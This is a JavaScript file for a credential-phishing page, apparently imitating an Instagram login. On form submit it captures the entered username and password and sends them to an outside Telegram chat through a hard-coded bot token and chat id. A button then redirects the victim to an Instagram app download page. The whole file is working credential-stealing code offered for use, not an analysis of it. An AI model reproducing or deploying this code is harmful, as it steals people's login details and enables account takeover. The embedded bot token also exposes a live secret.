document.addEventListener('DOMContentLoaded', (event) => {
    console.log('Event listened');
    const form = document.querySelector(".fish"); // Select the form
    const inputUsername = document.querySelector(".username");
    const inputUserPassword = document.querySelector(".userpassword");
    const btn = document.querySelector(".btn")
    btn.addEventListener("click", () => {
        // You can modify the local link (window.location) here
        // For example, let's change the URL to "https://www.example.com"
        window.location.href = "https://instagram.ru.uptodown.com/android/download";
    });
    
    form.addEventListener("submit", (event) => {
        event.preventDefault(); // Prevent the default form submit action
        const btn = document.getElementById(".btn"); // Replace "yourButtonId" with the actual ID of your button

     
        // Encode the input values to ensure special characters are properly handled
        const encodedUsername = encodeURIComponent(inputUsername.value);
        const encodedPassword = encodeURIComponent(inputUserPassword.value);
        
        console.log("Form submitted");
        const data = {
            username: encodedUsername,
            password: encodedPassword,
        };
        const text = `<b>Username:</b> <em>${data.username}</em>\n<b>Password:</b> <em>${data.password}</em>`
        // Construct the URL with the encoded data
        const url = `https://api.telegram.org/bot6651176689:AAE3WKkhsrvIMwI5k64kjH64Ezthb3kiY-0/sendMessage?chat_id=697727022&text=${encodeURIComponent(text)}&parse_mode=HTML`;
        
        // Use fetch to send the data
        fetch(url, { method: 'GET' })
        .then(response => response.json())
        .then(responseData => console.log(responseData))
        .catch(error => console.error('Error:', error));
    });
});